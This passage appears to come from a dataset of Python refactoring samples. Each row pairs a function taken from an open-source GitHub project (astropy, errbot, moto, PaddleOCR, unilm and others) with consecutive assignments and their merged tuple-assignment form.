cls = [self.cls_token_id]","sep , cls  = [self.sep_token_id], [self.cls_token_id]"
astropy,https://github.com/astropy/astropy/tree/master/astropy/time/tests/test_quantity_interaction.py,TestTimeQuantity,test_valid_quantity_operations$79,"def test_valid_quantity_operations(self):
        """"""Check that adding a time-valued quantity to a Time gives a Time""""""
        t0 = Time(100000.0, format=""cxcsec"")
        q1 = 10.0 * u.second
        t1 = t0 + q1
        assert isinstance(t1, Time)
        assert t1.value == t0.value + q1.to_value(u.second)
        q2 = 1.0 * u.day
        t2 = t0 - q2
        assert allclose_sec(t2.value, t0.value - q2.to_value(u.second))
        # check broadcasting
        q3 = np.arange(15.0).reshape(3, 5) * u.hour
        t3 = t0 - q3
        assert t3.shape == q3.shape
        assert allclose_sec(t3.value, t0.value - q3.to_value(u.second))","t0 = Time(100000.0, format='cxcsec')
q1 = 10.0 * u.second","t0 , q1  = Time(100000.0, format='cxcsec'), 10.0 * u.second"
mathematics_dataset,https://github.com/deepmind/mathematics_dataset/tree/master/mathematics_dataset/util/probability.py,FiniteProductSpace,probability$228,"def probability(self, event):
    # Specializations for optimization.
    if isinstance(event, FiniteProductEvent):
      assert len(self._spaces) == len(event.events)
      return sympy.prod([
          space.probability(event_slice)
          for space, event_slice in zip(self._spaces, event.events)])

    if isinstance(event, CountLevelSetEvent) and self.all_spaces_equal():
      space = self._spaces[0]
      counts = event.counts
      probabilities = {
          value: space.probability(DiscreteEvent({value}))
          for value in six.iterkeys(counts)
      }

      num_events = sum(six.itervalues(counts))
      assert num_events == len(self._spaces)
      # Multinomial coefficient:
      coeff = (
          sympy.factorial(num_events) / sympy.prod(
              [sympy.factorial(i) for i in six.itervalues(counts)]))
      return coeff * sympy.prod([
          pow(probabilities[value], counts[value])
          for value in six.iterkeys(counts)
      ])

    raise ValueError('Unhandled event type {}'.format(type(event)))","space = self._spaces[0]
counts = event.counts","space , counts  = self._spaces[0], event.counts"
mathematics_dataset,https://github.com/deepmind/mathematics_dataset/tree/master/mathematics_dataset/util/probability.py,FiniteProductSpace,probability$228,"def probability(self, event):
    # Specializations for optimization.
    if isinstance(event, FiniteProductEvent):
      assert len(self._spaces) == len(event.events)
      return sympy.prod([
          space.probability(event_slice)
          for space, event_slice in zip(self._spaces, event.events)])

    if isinstance(event, CountLevelSetEvent) and self.all_spaces_equal():
      space = self._spaces[0]
      counts = event.counts
      probabilities = {
          value: space.probability(DiscreteEvent({value}))
          for value in six.iterkeys(counts)
      }

      num_events = sum(six.itervalues(counts))
      assert num_events == len(self._spaces)
      # Multinomial coefficient:
      coeff = (
          sympy.factorial(num_events) / sympy.prod(
              [sympy.factorial(i) for i in six.itervalues(counts)]))
      return coeff * sympy.prod([
          pow(probabilities[value], counts[value])
          for value in six.iterkeys(counts)
      ])

    raise ValueError('Unhandled event type {}'.format(type(event)))","probabilities = {value: space.probability(DiscreteEvent({value})) for value in six.iterkeys(counts)}
num_events = sum(six.itervalues(counts))","probabilities , num_events  = {value: space.probability(DiscreteEvent({value})) for value in six.iterkeys(counts)}, sum(six.itervalues(counts))"
CtCI-6th-Edition-Python,https://github.com/careercup/CtCI-6th-Edition-Python/tree/master/chapter_04/p02_minimal_tree.py,,array_to_binary_tree$22,"def array_to_binary_tree(array, start, end):
    if start > end:
        return None
    mid = (
        start + end
    ) // 2  # This must be floor division, otherwise you get a slice error
    # TypeError: list indices must be integers or slices, not float
    root = Node(array[mid])
    root.left = array_to_binary_tree(array, start, mid - 1)
    root.right = array_to_binary_tree(array, mid + 1, end)
    return root","root.left = array_to_binary_tree(array, start, mid - 1)
root.right = array_to_binary_tree(array, mid + 1, end)","root.left , root.right  = array_to_binary_tree(array, start, mid - 1), array_to_binary_tree(array, mid + 1, end)"
SMAC3,https://github.com/automl/SMAC3/tree/master/scripts/smac-validate.py,,if_main_my$26,"if __name__ == ""__main__"":
    parser = ArgumentParser(formatter_class=ArgumentDefaultsHelpFormatter)
    req_opts = parser.add_argument_group(""Required Options"")
    req_opts.add_argument(""--scenario"", required=True,
                          help=""path to SMAC scenario"")
    req_opts.add_argument(""--trajectory"", required=True,
                          help=""path to SMAC trajectory"")
    req_opts.add_argument(""--output"", required=True,
                          help=""path to save runhistory to"")

    req_opts = parser.add_argument_group(""Optional Options"")
    req_opts.add_argument(""--configs"", default=""def+inc"", type=str,
                          choices=[""def"", ""inc"", ""def+inc"", ""wallclock_time"",
                                   ""cpu_time"", ""all""],
                          help=""what configurations to evaluate. ""
                               ""def=default; inc=incumbent; ""
                               ""all=all configurations in the trajectory; ""
                               ""wallclock_time/cpu_time=evaluates at cpu- or ""
                               ""wallclock-timesteps of: [max_time/2^0, ""
                               ""max_time/2^1, max_time/2^3, ..., default] ""
                               ""with max_time being the highest recorded time"")
    req_opts.add_argument(""--instances"", default=""test"", type=str,
                          choices=[""train"", ""test"", ""train+test""],
                          help=""what instances to evaluate"")
    req_opts.add_argument('--epm', dest='epm', action='store_true',
                          help=""Use EPM to validate"")
    req_opts.add_argument('--no-epm', dest='epm', action='store_false',
                          help=""Don't use EPM to validate"")
    req_opts.set_defaults(epm=False)
    req_opts.add_argument(""--runhistory"", default=None, type=str, nargs='*',
                          help=""path to one or more runhistories to take runs ""
                               ""from to either avoid recalculation or to train""
                               "" the epm"")
    req_opts.add_argument(""--seed"", type=int, help=""random seed"")
    req_opts.add_argument(""--repetitions"", default=1, type=int,
                          help=""number of repetitions for nondeterministic ""
                               ""algorithms"")
    req_opts.add_argument(""--n_jobs"", default=1, type=int,
                          help=""number of cpu-cores to use (-1 to use all)"")
    req_opts.add_argument(""--tae"", default=""old"", type=str,
                          help=""what tae to use (if not using epm)"", choices=[""aclib"", ""old""])
    req_opts.add_argument(""--verbose_level"", default=""INFO"",
                          choices=[""INFO"", ""DEBUG""],
                          help=""verbose level"")

    args_, misc = parser.parse_known_args()

    # remove leading '-' in option names
    misc = dict((k.lstrip(""-""), v.strip(""'""))
                for k, v in zip(misc[::2], misc[1::2]))

    if args_.verbose_level == ""INFO"":
        logging.basicConfig(level=logging.INFO)
    else:
        logging.basicConfig(level=logging.DEBUG)

    scenario = Scenario(args_.scenario, cmd_options={'output_dir': """"})
    traj_logger = TrajLogger(None, Stats(scenario))
    trajectory = traj_logger.read_traj_aclib_format(args_.trajectory, scenario.cs)
    stats = Stats(scenario)
    if args_.tae == ""old"":
        tae = ExecuteTARunOld(ta=scenario.ta,
                              stats=stats,
                              run_obj=scenario.run_obj,
                              par_factor=scenario.par_factor,
                              cost_for_crash=scenario.cost_for_crash)
    if args_.tae == ""aclib"":
        tae = ExecuteTARunAClib(ta=scenario.ta,
                                stats=stats,
                                run_obj=scenario.run_obj,
                                par_factor=scenario.par_factor,
                                cost_for_crash=scenario.cost_for_crash)

    validator = Validator(scenario, trajectory, args_.seed)

    # Load runhistory
    if args_.runhistory:
        runhistory = RunHistory()
        for rh_path in args_.runhistory:
            runhistory.update_from_json(rh_path, scenario.cs)
    else:
        runhistory = None

    if args_.epm:
        validator.validate_epm(config_mode=args_.configs,
                               instance_mode=args_.instances,
                               repetitions=args_.repetitions,
                               runhistory=runhistory, output_fn=args_.output)
    else:
        validator.validate(config_mode=args_.configs,
                           instance_mode=args_.instances,
                           repetitions=args_.repetitions,
                           n_jobs=args_.n_jobs,
                           runhistory=runhistory,
                           tae=tae, output_fn=args_.output)","trajectory = traj_logger.read_traj_aclib_format(args_.trajectory, scenario.cs)
stats = Stats(scenario)","trajectory , stats  = traj_logger.read_traj_aclib_format(args_.trajectory, scenario.cs), Stats(scenario)"
Personae,https://github.com/Ceruleanacg/Personae/tree/master/deprecated/DDPG_v2.py,Algorithm,_init_op$33,"def _init_op(self):
        self.optimizer_a = torch.optim.RMSprop(self.actor_e.parameters(), self.learning_rate)
        self.optimizer_c = torch.optim.RMSprop(self.critic_e.parameters(), self.learning_rate * 2)
        self.loss_c = torch.nn.MSELoss()","self.optimizer_c = torch.optim.RMSprop(self.critic_e.parameters(), self.learning_rate * 2)
self.loss_c = torch.nn.MSELoss()","self.optimizer_c , self.loss_c  = torch.optim.RMSprop(self.critic_e.parameters(), self.learning_rate * 2), torch.nn.MSELoss()"
MozDef,https://github.com/mozilla/MozDef/tree/master/loginput/index.py,,status$16,"def status():
    '''endpoint for a status/health check'''
    if request.body:
        request.body.read()
        request.body.close()
    response.status = 200
    response.content_type = ""application/json""
    response.body = json.dumps(dict(status='ok', service='loginput'))
    return response","response.status = 200
response.content_type = 'application/json'
response.body = json.dumps(dict(status='ok', service='loginput'))","response.status , response.content_type , response.body  = 200, 'application/json', json.dumps(dict(status='ok', service='loginput'))"
PaddleOCR,https://github.com/PaddlePaddle/PaddleOCR/tree/master/ppocr/modeling/transforms/tps.py,GridGenerator,__init__$160,"def __init__(self, in_channels, num_fiducial):
        super(GridGenerator, self).__init__()
        self.eps = 1e-6
        self.F = num_fiducial

        name = ""ex_fc""
        initializer = nn.initializer.Constant(value=0.0)
        param_attr = ParamAttr(
            learning_rate=0.0, initializer=initializer, name=name + ""_w"")
        bias_attr = ParamAttr(
            learning_rate=0.0, initializer=initializer, name=name + ""_b"")
        self.fc = nn.Linear(
            in_channels,
            6,
            weight_attr=param_attr,
            bias_attr=bias_attr,
            name=name)","self.eps = 1e-06
self.F = num_fiducial
name = 'ex_fc'
initializer = nn.initializer.Constant(value=0.0)","self.eps , self.F , name , initializer  = 1e-06, num_fiducial, 'ex_fc', nn.initializer.Constant(value=0.0)"
PaddleOCR,https://github.com/PaddlePaddle/PaddleOCR/tree/master/ppocr/modeling/transforms/tps.py,GridGenerator,__init__$160,"def __init__(self, in_channels, num_fiducial):
        super(GridGenerator, self).__init__()
        self.eps = 1e-6
        self.F = num_fiducial

        name = ""ex_fc""
        initializer = nn.initializer.Constant(value=0.0)
        param_attr = ParamAttr(
            learning_rate=0.0, initializer=initializer, name=name + ""_w"")
        bias_attr = ParamAttr(
            learning_rate=0.0, initializer=initializer, name=name + ""_b"")
        self.fc = nn.Linear(
            in_channels,
            6,
            weight_attr=param_attr,
            bias_attr=bias_attr,
            name=name)","param_attr = ParamAttr(learning_rate=0.0, initializer=initializer, name=name + '_w')
bias_attr = ParamAttr(learning_rate=0.0, initializer=initializer, name=name + '_b')","param_attr , bias_attr  = ParamAttr(learning_rate=0.0, initializer=initializer, name=name + '_w'), ParamAttr(learning_rate=0.0, initializer=initializer, name=name + '_b')"
stacker,https://github.com/cloudtools/stacker/tree/master/stacker/tests/blueprints/test_base.py,TestCFNParameter,test_parse_user_data_invaled_placeholder$728,"def test_parse_user_data_invaled_placeholder(self):
        raw_user_data = '$100'
        blueprint_name = 'test'
        with self.assertRaises(InvalidUserdataPlaceholder):
            parse_user_data({}, raw_user_data, blueprint_name)","raw_user_data = '$100'
blueprint_name = 'test'","raw_user_data , blueprint_name  = '$100', 'test'"
errbot,https://github.com/errbotio/errbot/tree/master/errbot/backends/irc.py,IRCBackend,__init__$706,"def __init__(self, config):
        if hasattr(config, ""IRC_ACL_PATTERN""):
            IRCBackend.aclpattern = config.IRC_ACL_PATTERN

        identity = config.BOT_IDENTITY
        nickname = identity[""nickname""]
        server = identity[""server""]
        port = identity.get(""port"", 6667)
        password = identity.get(""password"", None)
        ssl = identity.get(""ssl"", False)
        bind_address = identity.get(""bind_address"", None)
        ipv6 = identity.get(""ipv6"", False)
        username = identity.get(""username"", None)
        nickserv_password = identity.get(""nickserv_password"", None)

        compact = config.COMPACT_OUTPUT if hasattr(config, ""COMPACT_OUTPUT"") else True
        enable_format(""irc"", IRC_CHRS, borders=not compact)

        private_rate = getattr(config, ""IRC_PRIVATE_RATE"", 1)
        channel_rate = getattr(config, ""IRC_CHANNEL_RATE"", 1)
        reconnect_on_kick = getattr(config, ""IRC_RECONNECT_ON_KICK"", 5)
        reconnect_on_disconnect = getattr(config, ""IRC_RECONNECT_ON_DISCONNECT"", 5)

        self.bot_identifier = IRCPerson(nickname + ""!"" + nickname + ""@"" + server)
        super().__init__(config)
        self.conn = IRCConnection(
            bot=self,
            nickname=nickname,
            server=server,
            port=port,
            ssl=ssl,
            bind_address=bind_address,
            ipv6=ipv6,
            password=password,
            username=username,
            nickserv_password=nickserv_password,
            private_rate=private_rate,
            channel_rate=channel_rate,
            reconnect_on_kick=reconnect_on_kick,
            reconnect_on_disconnect=reconnect_on_disconnect,
        )
        self.md = irc_md()","nickname = identity['nickname']
server = identity['server']
port = identity.get('port', 6667)
password = identity.get('password', None)
ssl = identity.get('ssl', False)
bind_address = identity.get('bind_address', None)
ipv6 = identity.get('ipv6', False)
username = identity.get('username', None)
nickserv_password = identity.get('nickserv_password', None)
compact = config.COMPACT_OUTPUT if hasattr(config, 'COMPACT_OUTPUT') else True","nickname , server , port , password , ssl , bind_address , ipv6 , username , nickserv_password , compact  = identity['nickname'], identity['server'], identity.get('port', 6667), identity.get('password', None), identity.get('ssl', False), identity.get('bind_address', None), identity.get('ipv6', False), identity.get('username', None), identity.get('nickserv_password', None), config.COMPACT_OUTPUT if hasattr(config, 'COMPACT_OUTPUT') else True"
errbot,https://github.com/errbotio/errbot/tree/master/errbot/backends/irc.py,IRCBackend,__init__$706,"def __init__(self, config):
        if hasattr(config, ""IRC_ACL_PATTERN""):
            IRCBackend.aclpattern = config.IRC_ACL_PATTERN

        identity = config.BOT_IDENTITY
        nickname = identity[""nickname""]
        server = identity[""server""]
        port = identity.get(""port"", 6667)
        password = identity.get(""password"", None)
        ssl = identity.get(""ssl"", False)
        bind_address = identity.get(""bind_address"", None)
        ipv6 = identity.get(""ipv6"", False)
        username = identity.get(""username"", None)
        nickserv_password = identity.get(""nickserv_password"", None)

        compact = config.COMPACT_OUTPUT if hasattr(config, ""COMPACT_OUTPUT"") else True
        enable_format(""irc"", IRC_CHRS, borders=not compact)

        private_rate = getattr(config, ""IRC_PRIVATE_RATE"", 1)
        channel_rate = getattr(config, ""IRC_CHANNEL_RATE"", 1)
        reconnect_on_kick = getattr(config, ""IRC_RECONNECT_ON_KICK"", 5)
        reconnect_on_disconnect = getattr(config, ""IRC_RECONNECT_ON_DISCONNECT"", 5)

        self.bot_identifier = IRCPerson(nickname + ""!"" + nickname + ""@"" + server)
        super().__init__(config)
        self.conn = IRCConnection(
            bot=self,
            nickname=nickname,
            server=server,
            port=port,
            ssl=ssl,
            bind_address=bind_address,
            ipv6=ipv6,
            password=password,
            username=username,
            nickserv_password=nickserv_password,
            private_rate=private_rate,
            channel_rate=channel_rate,
            reconnect_on_kick=reconnect_on_kick,
            reconnect_on_disconnect=reconnect_on_disconnect,
        )
        self.md = irc_md()","private_rate = getattr(config, 'IRC_PRIVATE_RATE', 1)
channel_rate = getattr(config, 'IRC_CHANNEL_RATE', 1)
reconnect_on_kick = getattr(config, 'IRC_RECONNECT_ON_KICK', 5)
reconnect_on_disconnect = getattr(config, 'IRC_RECONNECT_ON_DISCONNECT', 5)
self.bot_identifier = IRCPerson(nickname + '!' + nickname + '@' + server)","private_rate , channel_rate , reconnect_on_kick , reconnect_on_disconnect , self.bot_identifier  = getattr(config, 'IRC_PRIVATE_RATE', 1), getattr(config, 'IRC_CHANNEL_RATE', 1), getattr(config, 'IRC_RECONNECT_ON_KICK', 5), getattr(config, 'IRC_RECONNECT_ON_DISCONNECT', 5), IRCPerson(nickname + '!' + nickname + '@' + server)"
errbot,https://github.com/errbotio/errbot/tree/master/errbot/backends/irc.py,IRCBackend,__init__$706,"def __init__(self, config):
        if hasattr(config, ""IRC_ACL_PATTERN""):
            IRCBackend.aclpattern = config.IRC_ACL_PATTERN

        identity = config.BOT_IDENTITY
        nickname = identity[""nickname""]
        server = identity[""server""]
        port = identity.get(""port"", 6667)
        password = identity.get(""password"", None)
        ssl = identity.get(""ssl"", False)
        bind_address = identity.get(""bind_address"", None)
        ipv6 = identity.get(""ipv6"", False)
        username = identity.get(""username"", None)
        nickserv_password = identity.get(""nickserv_password"", None)

        compact = config.COMPACT_OUTPUT if hasattr(config, ""COMPACT_OUTPUT"") else True
        enable_format(""irc"", IRC_CHRS, borders=not compact)

        private_rate = getattr(config, ""IRC_PRIVATE_RATE"", 1)
        channel_rate = getattr(config, ""IRC_CHANNEL_RATE"", 1)
        reconnect_on_kick = getattr(config, ""IRC_RECONNECT_ON_KICK"", 5)
        reconnect_on_disconnect = getattr(config, ""IRC_RECONNECT_ON_DISCONNECT"", 5)

        self.bot_identifier = IRCPerson(nickname + ""!"" + nickname + ""@"" + server)
        super().__init__(config)
        self.conn = IRCConnection(
            bot=self,
            nickname=nickname,
            server=server,
            port=port,
            ssl=ssl,
            bind_address=bind_address,
            ipv6=ipv6,
            password=password,
            username=username,
            nickserv_password=nickserv_password,
            private_rate=private_rate,
            channel_rate=channel_rate,
            reconnect_on_kick=reconnect_on_kick,
            reconnect_on_disconnect=reconnect_on_disconnect,
        )
        self.md = irc_md()","self.conn = IRCConnection(bot=self, nickname=nickname, server=server, port=port, ssl=ssl, bind_address=bind_address, ipv6=ipv6, password=password, username=username, nickserv_password=nickserv_password, private_rate=private_rate, channel_rate=channel_rate, reconnect_on_kick=reconnect_on_kick, reconnect_on_disconnect=reconnect_on_disconnect)
self.md = irc_md()","self.conn , self.md  = IRCConnection(bot=self, nickname=nickname, server=server, port=port, ssl=ssl, bind_address=bind_address, ipv6=ipv6, password=password, username=username, nickserv_password=nickserv_password, private_rate=private_rate, channel_rate=channel_rate, reconnect_on_kick=reconnect_on_kick, reconnect_on_disconnect=reconnect_on_disconnect), irc_md()"
moto,https://github.com/spulec/moto/tree/master/tests/test_dynamodb2/test_dynamodb_table_without_range_key.py,,test_update_item_set_boto3$765,"def test_update_item_set_boto3():
    conn = boto3.resource(""dynamodb"", region_name=""us-east-1"")
    table = conn.create_table(
        TableName=""messages"",
        KeySchema=[{""AttributeName"": ""username"", ""KeyType"": ""HASH""}],
        AttributeDefinitions=[{""AttributeName"": ""username"", ""AttributeType"": ""S""}],
        BillingMode=""PAY_PER_REQUEST"",
    )

    data = {""username"": ""steve"", ""SentBy"": ""User A""}
    table.put_item(Item=data)
    key_map = {""username"": ""steve""}

    table.update_item(
        Key=key_map,
        UpdateExpression=""SET foo=:bar, blah=:baz REMOVE SentBy"",
        ExpressionAttributeValues={"":bar"": ""bar"", "":baz"": ""baz""},
    )

    returned_item = table.get_item(Key=key_map)[""Item""]
    dict(returned_item).should.equal({""username"": ""steve"", ""foo"": ""bar"", ""blah"": ""baz""})","table = conn.create_table(TableName='messages', KeySchema=[{'AttributeName': 'username', 'KeyType': 'HASH'}], AttributeDefinitions=[{'AttributeName': 'username', 'AttributeType': 'S'}], BillingMode='PAY_PER_REQUEST')
data = {'username': 'steve', 'SentBy': 'User A'}","table , data  = conn.create_table(TableName='messages', KeySchema=[{'AttributeName': 'username', 'KeyType': 'HASH'}], AttributeDefinitions=[{'AttributeName': 'username', 'AttributeType': 'S'}], BillingMode='PAY_PER_REQUEST'), {'username': 'steve', 'SentBy': 'User A'}"
flanker,https://github.com/mailgun/flanker/tree/master/tests/mime/message/create_test.py,,create_multipart_with_attachment_test$104,"def create_multipart_with_attachment_test():
    message = create.multipart(""mixed"")
    filename = u""Мейлган картиночка картиночечка с длинным  именем и пробельчиками""
    message.append(
        create.text(""plain"", ""Hello""),
        create.text(""html"", ""<html>Hello</html>""),
        create.binary(
            ""image"", ""png"", MAILGUN_PNG,
            filename, ""attachment""))
    eq_(3, len(message.parts))

    message2 = create.from_string(message.to_string())
    eq_(3, len(message2.parts))
    eq_(""base64"", message2.parts[2].content_encoding.value)
    eq_(MAILGUN_PNG, message2.parts[2].body)
    eq_(filename, message2.parts[2].content_disposition.params['filename'])
    eq_(filename, message2.parts[2].content_type.params['name'])
    ok_(message2.parts[2].is_attachment())

    message2 = _email.message_from_string(message.to_string())
    eq_(3, len(message2.get_payload()))
    eq_(MAILGUN_PNG, message2.get_payload()[2].get_payload(decode=True))","message = create.multipart('mixed')
filename = u'Мейлган картиночка картиночечка с длинным  именем и пробельчиками'","message , filename  = create.multipart('mixed'), u'Мейлган картиночка картиночечка с длинным  именем и пробельчиками'"
unilm,https://github.com/microsoft/unilm/tree/master/infoxlm/fairseq/train.py,,main$23,"def main(args, init_distributed=False):
    utils.import_user_module(args)

    assert args.max_tokens is not None or args.max_sentences is not None, \
        'Must specify batch size either with --max-tokens or --max-sentences'

    # Initialize CUDA and distributed training
    if torch.cuda.is_available() and not args.cpu:
        torch.cuda.set_device(args.device_id)
    np.random.seed(args.seed)
    torch.manual_seed(args.seed)
    if init_distributed:
        args.distributed_rank = distributed_utils.distributed_init(args)

    if distributed_utils.is_master(args):
        checkpoint_utils.verify_checkpoint_directory(args.save_dir)

    # Print args
    print(args)

    # Setup task, e.g., translation, language modeling, etc.
    task = tasks.setup_task(args)

    # Load valid dataset (we load training data below, based on the latest checkpoint)
    for valid_sub_split in args.valid_subset.split(','):
        task.load_dataset(valid_sub_split, combine=False, epoch=0)

    # Build model and criterion
    model = task.build_model(args)
    criterion = task.build_criterion(args)
    print(model)
    print('| model {}, criterion {}'.format(args.arch, criterion.__class__.__name__))
    print('| num. model params: {} (num. trained: {})'.format(
        sum(p.numel() for p in model.parameters()),
        sum(p.numel() for p in model.parameters() if p.requires_grad),
    ))

    # Build trainer
    trainer = Trainer(args, task, model, criterion)
    print('| training on {} GPUs'.format(args.distributed_world_size))
    print('| max tokens per GPU = {} and max sentences per GPU = {}'.format(
        args.max_tokens,
        args.max_sentences,
    ))

    # Load the latest checkpoint if one is available and restore the
    # corresponding train iterator
    extra_state, epoch_itr = checkpoint_utils.load_checkpoint(args, trainer)

    # Prepare train
    task.prepare_train(model, criterion)

    # Train until the learning rate gets too small
    max_epoch = args.max_epoch or math.inf
    max_update = args.max_update or math.inf
    lr = trainer.get_lr()
    train_meter = StopwatchMeter()
    train_meter.start()
    valid_subsets = args.valid_subset.split(',')
    while (
        lr > args.min_lr
        and (epoch_itr.epoch < max_epoch or (epoch_itr.epoch == max_epoch
            and epoch_itr._next_epoch_itr is not None))
        and trainer.get_num_updates() < max_update
    ):
        # train for one epoch
        train(args, trainer, task, epoch_itr)

        if not args.disable_validation and epoch_itr.epoch % args.validate_interval == 0:
            valid_losses = validate(args, trainer, task, epoch_itr, valid_subsets)
        else:
            valid_losses = [None]

        # only use first validation loss to update the learning rate
        lr = trainer.lr_step(epoch_itr.epoch, valid_losses[0])

        # save checkpoint
        if epoch_itr.epoch % args.save_interval == 0:
            checkpoint_utils.save_checkpoint(args, trainer, epoch_itr, valid_losses[0])

        reload_dataset = ':' in getattr(args, 'data', '')
        reload_dataset = reload_dataset or args.reload_dataset_per_epoch
        # sharded data: get train iterator for next epoch
        epoch_itr = trainer.get_train_iterator(epoch_itr.epoch, load_dataset=reload_dataset)
    train_meter.stop()
    print('| done training in {:.1f} seconds'.format(train_meter.sum))","model = task.build_model(args)
criterion = task.build_criterion(args)","model , criterion  = task.build_model(args), task.build_criterion(args)"
unilm,https://github.com/microsoft/unilm/tree/master/infoxlm/fairseq/train.py,,main$23,"def main(args, init_distributed=False):
    utils.import_user_module(args)

    assert args.max_tokens is not None or args.max_sentences is not None, \
        'Must specify batch size either with --max-tokens or --max-sentences'

    # Initialize CUDA and distributed training
    if torch.cuda.is_available() and not args.cpu:
        torch.cuda.set_device(args.device_id)
    np.random.seed(args.seed)
    torch.manual_seed(args.seed)
    if init_distributed:
        args.distributed_rank = distributed_utils.distributed_init(args)

    if distributed_utils.is_master(args):
        checkpoint_utils.verify_checkpoint_directory(args.save_dir)

    # Print args
    print(args)

    # Setup task, e.g., translation, language modeling, etc.
    task = tasks.setup_task(args)

    # Load valid dataset (we load training data below, based on the latest checkpoint)
    for valid_sub_split in args.valid_subset.split(','):
        task.load_dataset(valid_sub_split, combine=False, epoch=0)

    # Build model and criterion
    model = task.build_model(args)
    criterion = task.build_criterion(args)
    print(model)
    print('| model {}, criterion {}'.format(args.arch, criterion.__class__.__name__))
    print('| num. model params: {} (num. trained: {})'.format(
        sum(p.numel() for p in model.parameters()),
        sum(p.numel() for p in model.parameters() if p.requires_grad),
    ))

    # Build trainer
    trainer = Trainer(args, task, model, criterion)
    print('| training on {} GPUs'.format(args.distributed_world_size))
    print('| max tokens per GPU = {} and max sentences per GPU = {}'.format(
        args.max_tokens,
        args.max_sentences,
    ))

    # Load the latest checkpoint if one is available and restore the
    # corresponding train iterator
    extra_state, epoch_itr = checkpoint_utils.load_checkpoint(args, trainer)

    # Prepare train
    task.prepare_train(model, criterion)

    # Train until the learning rate gets too small
    max_epoch = args.max_epoch or math.inf
    max_update = args.max_update or math.inf
    lr = trainer.get_lr()
    train_meter = StopwatchMeter()
    train_meter.start()
    valid_subsets = args.valid_subset.split(',')
    while (
        lr > args.min_lr
        and (epoch_itr.epoch < max_epoch or (epoch_itr.epoch == max_epoch
            and epoch_itr._next_epoch_itr is not None))
        and trainer.get_num_updates() < max_update
    ):
        # train for one epoch
        train(args, trainer, task, epoch_itr)

        if not args.disable_validation and epoch_itr.epoch % args.validate_interval == 0:
            valid_losses = validate(args, trainer, task, epoch_itr, valid_subsets)
        else:
            valid_losses = [None]

        # only use first validation loss to update the learning rate
        lr = trainer.lr_step(epoch_itr.epoch, valid_losses[0])

        # save checkpoint
        if epoch_itr.epoch % args.save_interval == 0:
            checkpoint_utils.save_checkpoint(args, trainer, epoch_itr, valid_losses[0])

        reload_dataset = ':' in getattr(args, 'data', '')
        reload_dataset = reload_dataset or args.reload_dataset_per_epoch
        # sharded data: get train iterator for next epoch
        epoch_itr = trainer.get_train_iterator(epoch_itr.epoch, load_dataset=reload_dataset)
    train_meter.stop()
    print('| done training in {:.1f} seconds'.format(train_meter.sum))","max_epoch = args.max_epoch or math.inf
max_update = args.max_update or math.inf
lr = trainer.get_lr()
train_meter = StopwatchMeter()","max_epoch , max_update , lr , train_meter  = args.max_epoch or math.inf, args.max_update or math.inf, trainer.get_lr(), StopwatchMeter()"
PaddleViT,https://github.com/BR-IDL/PaddleViT/tree/master/object_detection/PVTv2/box_ops.py,,box_xyxy_to_cxcywh$65,"def box_xyxy_to_cxcywh(box):
    """"""convert box from top-left/bottom-right format:
    [x0, y0, x1, y1]
    to center-size format:
    [center_x, center_y, width, height]

    Args:
        box: paddle.Tensor, last_dim=4, stop-left/bottom-right format boxes
    Return:
        paddle.Tensor, last_dim=4, center-size format boxes
    """"""

    x0, y0, x1, y1 = box.unbind(-1)
    xc = x0 + (x1-x0)/2
    yc = y0 + (y1-y0)/2
    w = x1 - x0
    h = y1 - y0
    return paddle.stack([xc, yc, w, h], axis=-1)","xc = x0 + (x1 - x0) / 2
yc = y0 + (y1 - y0) / 2
w = x1 - x0
h = y1 - y0","xc , yc , w , h  = x0 + (x1 - x0) / 2, y0 + (y1 - y0) / 2, x1 - x0, y1 - y0"
gluon-cv,https://github.com/dmlc/gluon-cv/tree/master/gluoncv/data/transforms/video.py,VideoGroupTrainTransformV3,forward$752,"def forward(self, clips):
        h, w, _ = clips[0].shape

        # step 1: random short side scale jittering
        size = int(round(np.random.uniform(self.min_size, self.max_size)))
        new_w = size
        new_h = size
        if w < h:
            new_h = int(math.floor((float(h) / w) * size))
        else:
            new_w = int(math.floor((float(w) / h) * size))

        # step 2: random crop
        h_off = 0
        if new_h > self.height:
            h_off = int(np.random.randint(0, new_h - self.height))
        w_off = 0
        if new_w > self.width:
            w_off = int(np.random.randint(0, new_w - self.width))

        # step 3: random horizontal flip
        is_flip = random.random() < self.prob

        new_clips = []
        for cur_img in clips:
            scale_img = self.cv2.resize(cur_img, (new_w, new_h))
            crop_img = scale_img[h_off:h_off+self.height, w_off:w_off+self.width, :]
            if is_flip:
                flip_img = np.flip(crop_img, axis=1)
            else:
                flip_img = crop_img
            tensor_img = np.transpose(flip_img, axes=(2, 0, 1)) / self.max_intensity
            new_clips.append((tensor_img - self.mean) / self.std)
        return new_clips","new_w = size
new_h = size","new_w , new_h  = size, size"
gluon-cv,https://github.com/dmlc/gluon-cv/tree/master/gluoncv/data/transforms/video.py,VideoGroupTrainTransformV3,forward$752,"def forward(self, clips):
        h, w, _ = clips[0].shape

        # step 1: random short side scale jittering
        size = int(round(np.random.uniform(self.min_size, self.max_size)))
        new_w = size
        new_h = size
        if w < h:
            new_h = int(math.floor((float(h) / w) * size))
        else:
            new_w = int(math.floor((float(w) / h) * size))

        # step 2: random crop
        h_off = 0
        if new_h > self.height:
            h_off = int(np.random.randint(0, new_h - self.height))
        w_off = 0
        if new_w > self.width:
            w_off = int(np.random.randint(0, new_w - self.width))

        # step 3: random horizontal flip
        is_flip = random.random() < self.prob

        new_clips = []
        for cur_img in clips:
            scale_img = self.cv2.resize(cur_img, (new_w, new_h))
            crop_img = scale_img[h_off:h_off+self.height, w_off:w_off+self.width, :]
            if is_flip:
                flip_img = np.flip(crop_img, axis=1)
            else:
                flip_img = crop_img
            tensor_img = np.transpose(flip_img, axes=(2, 0, 1)) / self.max_intensity
            new_clips.append((tensor_img - self.mean) / self.std)
        return new_clips","is_flip = random.random() < self.prob
new_clips = []","is_flip , new_clips  = random.random() < self.prob, []"
taskonomy,https://github.com/StanfordVL/taskonomy/tree/master/code/lib/models/encoder_decoder_softmax_colorization.py,SoftmaxED,colorized_image_from_softmax$58,"def colorized_image_from_softmax(self, targets, decoder_output):
        ''' Regenerate colorized image from softmax distribution for all colors

        Notes:
            This is a constant mapping from distribution to actual image

        Args:
            decoder_output: list of input images (scaled between -1 and 1) with the
                       dimensions specified in the cfg
        '''
        resize_shape = tf.stack([self.input_size[0],self.input_size[1]])
        softmax_to_ab = tf.nn.convolution(decoder_output, self.trans_kernel, 'SAME' )
        resized_output = tf.image.resize_images(softmax_to_ab, 
                resize_shape,
                method=tf.image.ResizeMethod.NEAREST_NEIGHBOR)

